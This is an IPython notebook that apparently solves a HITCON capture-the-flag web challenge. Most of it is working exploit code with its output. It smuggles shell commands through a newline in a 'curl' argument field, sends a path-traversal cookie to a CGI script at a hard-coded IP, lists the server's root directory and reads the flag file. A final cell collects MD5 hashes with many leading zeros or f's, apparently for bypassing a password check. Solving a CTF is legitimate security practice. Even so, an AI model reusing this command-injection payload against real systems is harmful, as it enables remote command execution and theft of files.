{
 "metadata": {
  "name": "",
  "signature": "sha256:a1f112ed87c055a91ae478f3dc62ae0948b9be7a10d52eeee9ce298daaca304e"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "headers = dict()\n",
      "headers = {'User-Agent': 'Mozilla/5.0'}\n",
      "cookies = {\"diagsess\":\"../etc/passwd\"} # doesn't matter\n",
      "cmd =\" ls /\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "bin\n",
        "boot\n",
        "dev\n",
        "etc\n",
        "home\n",
        "initrd.img\n",
        "key.txt\n",
        "lib\n",
        "lib64\n",
        "lost+found\n",
        "media\n",
        "mnt\n",
        "opt\n",
        "proc\n",
        "read_key\n",
        "root\n",
        "run\n",
        "sbin\n",
        "srv\n",
        "sys\n",
        "tmp\n",
        "usr\n",
        "var\n",
        "vmlinuz\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd = \"/read_key /key.txt\"\n",
      "# or use python to read stderr\n",
      "# cmd = \"python -c s=__import__('subprocess');print(s.check_output('/read_key'+chr(32)+'/key.txt',stderr=s.STDOUT,shell=True))\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "HITCON{a755be06b165ed8fc4710d3544fce942}\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# BTW, attempts to find an admin password\n",
      "# from http://calebmadrigal.com/display-list-as-table-in-ipython-notebook/\n",
      "class ListTable(list):\n",
      "    \"\"\" Overridden list class which takes a 2-dimensional list of \n",
      "        the form [[1,2,3],[4,5,6]], and renders an HTML Table in \n",
      "        IPython Notebook. \"\"\"\n",
      "    \n",
      "    def _repr_html_(self):\n",
      "        html = [\"<table>\"]\n",
      "        for row in self:\n",
      "            html.append(\"<tr>\")\n",
      "            \n",
      "            for col in row:\n",
      "                html.append(\"<td>{0}</td>\".format(col))\n",
      "            \n",
      "            html.append(\"</tr>\")\n",
      "        html.append(\"</table>\")\n",
      "        return ''.join(html)\n",
      "    \n",
      "from hashlib import md5\n",
      "L =[\"175d6ad1a\",  \"djGFYmi\", \"ZkjAFaaaa\", \"jk8ssl\",\n",
      "          \"G/I2/vILur4AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA=\".decode(\"base64\"),\n",
      "         \"Vf3ppC4Iu74AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA=\".decode(\"base64\"),\n",
      "        \"6Za/F6+mur4AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA= \".decode(\"base64\"),\n",
      "         \"1b8a887770\", \"4d07fba3b0\", \"d3cc47d0c1\", \"066dff245a\", \"5de39642da\", \n",
      "        \"a&37$Ca\", \"nx3kwqa\"]\n",
      "S = sorted( (md5(x).hexdigest(), x) for x in L )\n",
      "ListTable([['Leading 0 or f', 'md5 hexdigest', 'plaintext']]+[[[i for i in range(len(s[0])-1) if s[0][i]!=s[0][i+1]][0]+1, s[0], repr(s[1])] for s in S])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<table><tr><td>Leading 0 or f</td><td>md5 hexdigest</td><td>plaintext</td></tr><tr><td>12</td><td>0000000000006c32a237fc882cc44a4b</td><td>'U\\xfd\\xe9\\xa4.\\x08\\xbb\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr><tr><td>11</td><td>00000000000277ec3301b3cabacb95c9</td><td>'\\x1b\\xf26\\xfe\\xf2\\x0b\\xba\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr><tr><td>11</td><td>00000000000639f3eb26b63f0a7baca3</td><td>'ZkjAFaaaa'</td></tr><tr><td>11</td><td>00000000000ccda838e4b06d6d662dca</td><td>'djGFYmi'</td></tr><tr><td>10</td><td>000000000073e0211102fd6bf4ffeddb</td><td>'066dff245a'</td></tr><tr><td>10</td><td>0000000000a23e0c9d184e6d884cf3be</td><td>'d3cc47d0c1'</td></tr><tr><td>9</td><td>0000000003ee02085b4fd9cc5a1fecac</td><td>'nx3kwqa'</td></tr><tr><td>9</td><td>000000000440a6d4accf344dd87a906d</td><td>'4d07fba3b0'</td></tr><tr><td>8</td><td>0000000018e6137ac2caab16074784a6</td><td>'jk8ssl'</td></tr><tr><td>9</td><td>fffffffffe3ca25c8ae90a28e7be700c</td><td>'a&37$Ca'</td></tr><tr><td>9</td><td>fffffffffebbf751770c344956393255</td><td>'175d6ad1a'</td></tr><tr><td>9</td><td>fffffffffee3f8c2e36353f43b7ef7d8</td><td>'1b8a887770'</td></tr><tr><td>10</td><td>ffffffffffbd4e5561275deaf83b5756</td><td>'5de39642da'</td></tr><tr><td>12</td><td>ffffffffffff4de6f952846ffc0f4d15</td><td>'\\xe9\\x96\\xbf\\x17\\xaf\\xa6\\xba\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr></table>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 40,
       "text": [
        "[['Leading 0 or f', 'md5 hexdigest', 'plaintext'],\n",
        " [12,\n",
        "  '0000000000006c32a237fc882cc44a4b',\n",
        "  \"'U\\\\xfd\\\\xe9\\\\xa4.\\\\x08\\\\xbb\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"],\n",
        " [11,\n",
        "  '00000000000277ec3301b3cabacb95c9',\n",
        "  \"'\\\\x1b\\\\xf26\\\\xfe\\\\xf2\\\\x0b\\\\xba\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"],\n",
        " [11, '00000000000639f3eb26b63f0a7baca3', \"'ZkjAFaaaa'\"],\n",
        " [11, '00000000000ccda838e4b06d6d662dca', \"'djGFYmi'\"],\n",
        " [10, '000000000073e0211102fd6bf4ffeddb', \"'066dff245a'\"],\n",
        " [10, '0000000000a23e0c9d184e6d884cf3be', \"'d3cc47d0c1'\"],\n",
        " [9, '0000000003ee02085b4fd9cc5a1fecac', \"'nx3kwqa'\"],\n",
        " [9, '000000000440a6d4accf344dd87a906d', \"'4d07fba3b0'\"],\n",
        " [8, '0000000018e6137ac2caab16074784a6', \"'jk8ssl'\"],\n",
        " [9, 'fffffffffe3ca25c8ae90a28e7be700c', \"'a&37$Ca'\"],\n",
        " [9, 'fffffffffebbf751770c344956393255', \"'175d6ad1a'\"],\n",
        " [9, 'fffffffffee3f8c2e36353f43b7ef7d8', \"'1b8a887770'\"],\n",
        " [10, 'ffffffffffbd4e5561275deaf83b5756', \"'5de39642da'\"],\n",
        " [12,\n",
        "  'ffffffffffff4de6f952846ffc0f4d15',\n",
        "  \"'\\\\xe9\\\\x96\\\\xbf\\\\x17\\\\xaf\\\\xa6\\\\xba\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"]]"
       ]
      }
     ],
     "prompt_number": 40
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}